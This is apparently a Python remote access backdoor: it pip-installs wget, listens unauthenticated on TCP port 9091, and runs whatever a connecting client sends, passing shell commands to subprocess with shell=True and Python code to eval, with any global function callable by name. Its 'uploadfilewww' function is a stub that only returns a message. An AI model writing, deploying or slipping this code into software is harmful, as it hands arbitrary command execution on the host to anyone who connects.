#Imports
import os
import socket
import sys
import subprocess
from subprocess import PIPE, Popen

#Install libraries
subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'wget'])
import wget

#Settings
port = 9091

#CMDS
def shellcmd(args):
    cmd = args[1]
    
    try:
        output = subprocess.check_output(cmd, shell=True)
    except:
        print("error in shellcmd (fix your windows shell command)")
        output = "error"
    print(output)
    return output
    
def uploadfilewww(args):
    url = args[1]
    location = args[2]
    try:
        output = "Downloaded " + url + " to " + location
    except:
        print("error in uploadfilewww (use anonfiles and copy download link)")
        output = "error"
    return output

def osname(args):
    import platform
    return platform.system()

def listdirectory(args):
    print("listing directories")
    dir = args[1]
    try:
        output = os.listdir(dir)
    except:
        print("error in list directory")
        output = "error"
    return output

def remexec(args):
    remcode = args[1]
    output = ""
    output = eval(remcode)
    try:
        output = eval(remcode)
    except:
        print("except error in remote exec (fix your python command)")
        output = "error"
    print(str(output))
    return str(output)
    

#Functions
#def setup():


def executecmd(args):
    cmd = args[0]
    print(cmd)
    targetFunc = globals()[str(cmd)]
    result = targetFunc(args)
    return result



#Main
def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind(("", port))
        sock.listen(9999)
        while True:
            conn, addr = sock.accept()
            with conn:
                print('Connected by', addr)
                while True:
                    data = conn.recv(1024)
                    if not data: break
                    receivedCMD = repr(data)
                    receivedCMD = receivedCMD[2:-1]
                    CMDandArgs = receivedCMD.split("|")
                    print(CMDandArgs)
                    cmdOut = executecmd(CMDandArgs)
                    print(cmdOut)
                    if(cmdOut != ""):
                        conn.sendall(str(cmdOut).encode("utf-8"))
            
main()
